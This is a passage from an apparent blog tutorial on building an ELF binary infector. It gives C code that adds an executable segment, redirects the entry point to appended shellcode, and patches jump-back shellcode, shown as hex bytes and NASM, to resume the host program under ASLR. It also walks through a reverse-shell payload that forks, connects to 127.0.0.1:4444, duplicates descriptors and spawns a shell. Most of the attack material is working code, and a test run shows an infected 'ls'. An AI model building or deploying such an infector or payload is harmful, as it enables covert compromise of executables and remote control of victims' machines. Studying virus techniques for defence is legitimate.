</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Patched e_entry</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Patch shellcode to jump to the original entry point after finishing
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>patch</span><span class=p>(</span><span class=o>&amp;</span><span class=n>shellcode</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>shellcode_len</span><span class=p>,</span> <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_entry</span><span class=p>,</span> <span class=n>original_entry</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   
</span></span></code></pre></div><p>A few remarks about what&rsquo;s going on here, exactly:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>p_type = PT_LOAD;             // Set PT_LOAD flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p_flags = PF_R | PF_X;        // Set read and execute permissions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p_offset = file_offset;       // Set p_offset to the file_offset. The file_offset
</span></span><span class=line><span class=cl>                              // is the size of the original ELF binary.
</span></span><span class=line><span class=cl>                              // And what&#39;s at the *end* of our ELF?
</span></span><span class=line><span class=cl>                              // The shellcode we append.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p_vaddr = memory_offset;      // The virtual address offset we want to map our 
</span></span><span class=line><span class=cl>                              // shellcode to. Equivalent to the file size
</span></span><span class=line><span class=cl>                              // offset but at a higher address range, e.g.
</span></span><span class=line><span class=cl>                              // 0xc00000000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p_memsz += sc_len;            // Increase the number of bytes in the file 
</span></span><span class=line><span class=cl>                              // image of the segment by the length of 
</span></span><span class=line><span class=cl>                              // the shellcode
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p_filesz += sc_len;           // Increase the number of bytes in the memory 
</span></span><span class=line><span class=cl>                              // image of the segment by the length of the 
</span></span><span class=line><span class=cl>                              // shellcode
</span></span></code></pre></div><p>Lastly, use assign <code>elf_header->e_entry = memory_offset</code>, modifying the ELF entry to point to our memory offset where our shellcode will reside when it&rsquo;s loaded.</p><h2 id=and-patch-me-up>And Patch Me Up<a hidden class=anchor aria-hidden=true href=#and-patch-me-up>#</a></h2><p>The next step is really important to understand. This is where we call our very helpful <code>patch</code> function.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>    <span class=c1>// Patch shellcode to jump to the original entry point after finishing
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>patch</span><span class=p>(</span><span class=o>&amp;</span><span class=n>shellcode</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>shellcode_len</span><span class=p>,</span> <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_entry</span><span class=p>,</span> <span class=n>original_entry</span><span class=p>);</span>
</span></span></code></pre></div><p>And once inside, there&rsquo;s an additional array of shellcode called <code>jump_shellcode</code>. We patch this array with the values we pass to the <code>patch</code> function.</p><p>We then modify the original shellcode buffer from earlier &ndash; extending it by the size of the additional <code>jump_shellcode</code> array.</p><p>After our original shellcode array is extended by the size of the <code>jump_shellcode</code> array, we <code>memcpy</code> the additional patched <code>jump_shellcode</code> into the extended shellcode buffer space, aka at the end of our malware code. And finally we update our shellcode buffer and length pointers to our new updated shellcode buffer and length pointers.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// Patch in shellcode from jumpstart.s to resolve original_entry point
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>patch</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>**</span><span class=n>shellcode</span><span class=p>,</span> <span class=kt>size_t</span> <span class=o>*</span><span class=n>shellcode_len</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>entry_point</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>original_entry</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>jump_shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xe8</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0xb9</span><span class=p>,</span> <span class=mh>0xef</span><span class=p>,</span> <span class=mh>0xbe</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span> <span class=mh>0xde</span><span class=p>,</span> <span class=mh>0xef</span><span class=p>,</span> <span class=mh>0xbe</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span> <span class=mh>0xde</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0xba</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0xf0</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span> <span class=mh>0xba</span><span class=p>,</span> <span class=mh>0x0d</span><span class=p>,</span> <span class=mh>0xf0</span><span class=p>,</span> <span class=mh>0xad</span><span class=p>,</span> <span class=mh>0xba</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0xbb</span><span class=p>,</span> <span class=mh>0xb5</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0xb1</span><span class=p>,</span> <span class=mh>0xb5</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0xb1</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0xc8</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x83</span><span class=p>,</span> <span class=mh>0xe8</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0xd0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0xd8</span><span class=p>,</span> <span class=mh>0xff</span><span class=p>,</span> <span class=mh>0xe0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0xc3</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Write values using little-endian ordering
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>write_u64_le</span><span class=p>(</span><span class=o>&amp;</span><span class=n>jump_shellcode</span><span class=p>[</span><span class=mi>7</span><span class=p>],</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)(</span><span class=o>*</span><span class=n>shellcode_len</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>write_u64_le</span><span class=p>(</span><span class=o>&amp;</span><span class=n>jump_shellcode</span><span class=p>[</span><span class=mi>17</span><span class=p>],</span> <span class=n>entry_point</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>write_u64_le</span><span class=p>(</span><span class=o>&amp;</span><span class=n>jump_shellcode</span><span class=p>[</span><span class=mi>27</span><span class=p>],</span> <span class=n>original_entry</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Extend shellcode vector by appending the jump_shellcode size;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Realloc new size, memcpy jump_shellcode into extended space
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>size_t</span> <span class=n>new_len</span> <span class=o>=</span> <span class=o>*</span><span class=n>shellcode_len</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>jump_shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>new_shellcode</span> <span class=o>=</span> <span class=nf>realloc</span><span class=p>(</span><span class=o>*</span><span class=n>shellcode</span><span class=p>,</span> <span class=n>new_len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>new_shellcode</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error reallocating shellcode buffer</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=o>*</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>new_shellcode</span> <span class=o>+</span> <span class=o>*</span><span class=n>shellcode_len</span><span class=p>,</span> <span class=n>jump_shellcode</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>jump_shellcode</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>shellcode</span> <span class=o>=</span> <span class=n>new_shellcode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>shellcode_len</span> <span class=o>=</span> <span class=n>new_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Our shellcode length, aka VSIZE, is stored starting at byte 8. Our entry point, aka <code>ENTRY</code>, is stored at byte 17. Our original entry, aka <code>START</code> is stored at byte 27.</p><p>See, the constants we define in the assembly &ndash; which we use to generate the jump shellcode &ndash; are merely placeholders. The values in the <code>jump_shellcode</code> array are being overwritten with <em>our</em> values &ndash; our shellcode length, entry point, and original entry.</p><p>After the patch function completes, we go back to the main function where we write all of this back to the target ELF &ndash; appending our shellcode to the <em>end</em> of the binary by calling <code>SEEK_END</code> on our ELF file descriptor &ndash; and using our write gadgets to write back the altered program headers to the ELF file.</p><p>Below is the assembly code of the <code>jump_shellcode</code> array. If it doesn&rsquo;t make sense yet, I&rsquo;ll try to explain below.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=line><span class=cl><span class=k>BITS</span> <span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=cp>%define VSIZE 0xDEADBEEFDEADBEEF   
</span></span></span><span class=line><span class=cl><span class=cp>%define ENTRY 0xBAADF00DBAADF00D
</span></span></span><span class=line><span class=cl><span class=cp>%define START 0xB16B00B5B16B00B5   
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>    <span class=c1>; - position independent executables move addresses, so</span>
</span></span><span class=line><span class=cl>    <span class=c1>; 1) call to get_foo instruction pointer into rax then </span>
</span></span><span class=line><span class=cl>    <span class=c1>; 2) load our constants into registers r9, r10, r11</span>
</span></span><span class=line><span class=cl>    <span class=c1>; 3) subtract our malware size, (&amp; subtract 5!)</span>
</span></span><span class=line><span class=cl>    <span class=c1>;   *(the size of the get_foo instruction)</span>
</span></span><span class=line><span class=cl>    <span class=c1>; 4) subtract patched entry offset from rax  </span>
</span></span><span class=line><span class=cl>    <span class=c1>; 5) add our original entry point to r11</span>
</span></span><span class=line><span class=cl>    <span class=c1>; 6) finally jmp to rax</span>
</span></span><span class=line><span class=cl>    <span class=nf>call</span> <span class=nv>get_foo</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nv>r9</span><span class=p>,</span> <span class=nv>VSIZE</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nv>r10</span><span class=p>,</span> <span class=nv>ENTRY</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nv>r11</span><span class=p>,</span> <span class=nv>START</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub</span> <span class=nb>rax</span><span class=p>,</span> <span class=nv>r9</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub</span> <span class=nb>rax</span><span class=p>,</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=nf>sub</span> <span class=nb>rax</span><span class=p>,</span> <span class=nv>r10</span>
</span></span><span class=line><span class=cl>    <span class=nf>add</span> <span class=nb>rax</span><span class=p>,</span> <span class=nv>r11</span>
</span></span><span class=line><span class=cl>    <span class=nf>jmp</span> <span class=nb>rax</span>
</span></span><span class=line><span class=cl><span class=nl>get_foo:</span>
</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=nb>rax</span><span class=p>,</span> <span class=p>[</span><span class=nb>rsp</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nf>ret</span>
</span></span></code></pre></div><p><em><strong>Why do we need the patch?</strong></em> Modern ELF binaries are often built to use ASLR and therefore tend to be position independent executables. That is to say, each time an ELF file runs, its address layout is semi-randomized and loaded into a different memory space.<sup id=fnref:12><a href=#fn:12 class=footnote-ref role=doc-noteref>12</a></sup> It achieves this by implementing a random base address.</p><p>This means we can&rsquo;t just hardcode a return address to go to after our malware executes. And instead, we rely on this one weird trick we append to the end of our malware code to help us jump back to the original entry point.<sup id=fnref:13><a href=#fn:13 class=footnote-ref role=doc-noteref>13</a></sup></p><p>The constants end up representing our malware shellcode size, our memory_offset (the new e_entry), and the original entry point that we</p><p>With our bytes now patched into this mini program, the logic of the assembly code works like this. Think about it.</p><p><em>After</em> our malware has executed, we slide into the <code>jump_shellcode</code>. We first call <code>get_foo</code> and store the stack pointer in <code>rax</code> and then return.</p><p>We then move our constants &ndash; the malware shellcode size, patched entry, and the original start address, to registers <code>r9</code>, <code>r10</code>, and <code>r11</code>.</p><p>Then we do the following trick. You can visualize this pretty clearly. Remember, after our virus has executed, we are currently at the <em>end</em> of the malware shellcode, where we enter the additional <code>jump_shellcode</code> array. So, in order to find out where we are, we have to work <em>backwards</em>.</p><p>So first we substract the size of our malware shellcode <code>VSIZE</code> from the stack pointer in <code>rax</code>. Then we subtract <code>5</code> to adjust for the size of the <code>get_foo</code> instruction itself.</p><p>At this point in time, the stack pointer is now effectively back at the patched <code>ENTRY</code> offset. But we want to get to the original <code>START</code> entry point. So we substract the <code>ENTRY</code> offset, extracting the base randomization!</p><p>And now we add back the original entry point <code>START</code> we stored in <code>r11</code> to <code>rax</code>. That is, <code>rax</code> now contains the original entry point so we can call <code>jmp rax</code>, landing into the ELF&rsquo;s original entry point and preserving the program&rsquo;s host behavior &ndash; every time &ndash; even though the executable is position independent.</p><p>With our <code>jump_shellcode</code> appended to our original shellcode, we write all of the alterations back to the ELF binary:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>// Append shellcode to the very end of the target ELF
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>lseek</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>SEEK_END</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error seeking to end of ELF file: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>strerror</span><span class=p>(</span><span class=n>errno</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>elf_header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>program_headers</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>write</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>,</span> <span class=n>shellcode_len</span><span class=p>)</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>ssize_t</span><span class=p>)</span><span class=n>shellcode_len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error writing shellcode to ELF file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>elf_header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>program_headers</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//snipped
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// Write the ELF64 program headers to the file at offset phoff
</span></span></span><span class=line><span class=cl><span class=c1>// Return 0 on success, or non-zero on failure
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>write_elf64_program_headers</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>phoff</span><span class=p>,</span> <span class=kt>uint16_t</span> <span class=n>phnum</span><span class=p>,</span> <span class=n>Elf64_Phdr</span> <span class=o>*</span><span class=n>phdrs</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>phoff</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error seeking to program headers offset for writing</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>total_size</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Phdr</span><span class=p>)</span> <span class=o>*</span> <span class=n>phnum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>phdrs</span><span class=p>,</span> <span class=n>total_size</span><span class=p>)</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>ssize_t</span><span class=p>)</span><span class=n>total_size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error writing program headers to ELF file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Write the ELF64 header to the beginning of the file
</span></span></span><span class=line><span class=cl><span class=c1>// Return 0 on success, or non-zero on failure
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>write_elf64_header</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=n>Elf64_Ehdr</span> <span class=o>*</span><span class=n>header</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error seeking to beginning of ELF file for header writing</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>header</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Ehdr</span><span class=p>))</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Ehdr</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error writing ELF header to file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h2 id=assembling-a-payload>Assembling a Payload<a hidden class=anchor aria-hidden=true href=#assembling-a-payload>#</a></h2><p>Embarrassingly, it took me a little while to get a reliable payload working. Initially, my program would segfault and I thought I messed up the infector. At another point, it would segfault while the shell would survive. And as I got closer, it would sometimes <em>almost</em> work&ndash;but yet still segfault.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ ./ls
</span></span><span class=line><span class=cl>Segmentation fault (core dumped)
</span></span><span class=line><span class=cl>$ ./ls
</span></span><span class=line><span class=cl>Segmentation fault (core dumped)
</span></span><span class=line><span class=cl>$ ./ls
</span></span><span class=line><span class=cl>elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
</span></span><span class=line><span class=cl>ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
</span></span><span class=line><span class=cl>Segmentation fault (core dumped)
</span></span><span class=line><span class=cl>$ ./ls
</span></span><span class=line><span class=cl>elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
</span></span><span class=line><span class=cl>ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
</span></span><span class=line><span class=cl>Segmentation fault (core dumped)
</span></span><span class=line><span class=cl>$ ./ls
</span></span><span class=line><span class=cl>Segmentation fault (core dumped)
</span></span><span class=line><span class=cl>$ ./ls
</span></span><span class=line><span class=cl>elf_infector  maybe    maybe2    maybe3.s  maybe4.s  maybe5.s  maybe6.s  maybe7.s  maybe8.s
</span></span><span class=line><span class=cl>ls        maybe.s  maybe2.s  maybe4    maybe5    maybe6    maybe7    maybe8
</span></span><span class=line><span class=cl>Segmentation fault (core dumped)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>(╯°□°）╯︵ ┻━┻
</span></span></code></pre></div><p>One issue was the way that I originally ordered the logic of the <code>fork</code> in my payload code. Initially I tried to jump into the <code>fork</code>. And then I accidentally mucked up the stack. But then I realized that you could just spawn it and return to the parent process pretty easily.</p><p>The other issues were with <code>ret</code> sometimes messing up the stack alignment. If you call <code>ret</code> at the end, during the return to the parent process, it messes up the stack.</p><p>Eventually, I realized that the answer to all of this was a lot more straight forward and that my approach to using <code>fork</code> to spawn a process in the background was feasible and could be improved. And that the stack could in fact be preserved and restored in a reliable way.</p><p>After a bit of trial and error &ndash; and remembering to correctly return the stack pointer &ndash; the shellcode seems reliable now. In the end, the stable assembly code I ended up creating goes something like this:</p><p>First, we try to preserve the behavior of the infected host binary by saving all of the registers by pushing them to the stack, along with the stack pointer.</p><p>Only then do we try to call the <code>fork</code> syscall. The <code>child_process</code> then spawns off where it prepares its networking code.</p><p>Inside the forked <code>child_process</code>, we prepare to use the <code>socket</code> syscall by setting up the <code>AF_INET</code>, <code>SOCK_STREAM</code>, and <code>IPPROTOC_TCP</code> arguments.</p><p>If the socket setup fails, our <code>child_process</code> &ndash; now separated from the parent &ndash; fails silently. Otherwise, we likely have a good file descriptor and so we move it to <code>rdi</code>.</p><p>Continuing, we prepare to use the <code>connect</code> syscall. First we <code>xor</code> the <code>rdx</code> register clearing it before pushing it to the stack as a <code>NULL</code> pad, before pushing the address we want to connect to. Here, we just use localhost, <code>127.0.0.1</code>, and our chosen port <code>4444</code>.</p><p>We push the AF_INET (address family) <code>2</code>, then move the stack pointer to <code>rsi</code> for the <code>sockaddr</code> pointer and set it to its correct structure size of 16 bytes.</p><p>We make the <code>connect</code> syscall which uses the previously mentioned bits along with our file descriptor in <code>rdi</code>, and if it fails, we exit gracefully. Otherwise, we setup to duplicate the file descriptor with <code>dup2</code> and move on to execute our shell.</p><blockquote><p>&ldquo;<em>dup2 doesn&rsquo;t switch the file descriptors, it makes them equivalent. After dup2(f1, 0), whatever file was opened on descriptor f1 is now also opened (with the same mode and position) on descriptor 0, i.e. on standard input.</em></p></blockquote><blockquote><p><em>If the target file descriptor was open, it is closed by the dup2 call. This is useful (among other things) when you have part of a program that reads or write from the standard file descriptors. For example, suppose that somefunc() reads from standard input, but you want it to read from a different file from where the rest of the program is getting its standard input. Then you can do (error checking omitted):</em>&rdquo;</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=n>save_stdin</span> <span class=o>=</span> <span class=nf>dup</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>somefunc_input_fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;input-for-somefunc.data&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>dup2</span><span class=p>(</span><span class=n>somefunc_input_fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cm>/* Now the original stdin is open on save_stdin, and input-for-somefunc.data on 
</span></span></span><span class=line><span class=cl><span class=cm>both somefunc_input_fd and 0. */</span>
</span></span><span class=line><span class=cl><span class=nf>somefunc</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nf>close</span><span class=p>(</span><span class=n>somefunc_input_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>dup2</span><span class=p>(</span><span class=n>save_stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>close</span><span class=p>(</span><span class=n>save_stdin</span><span class=p>);</span>
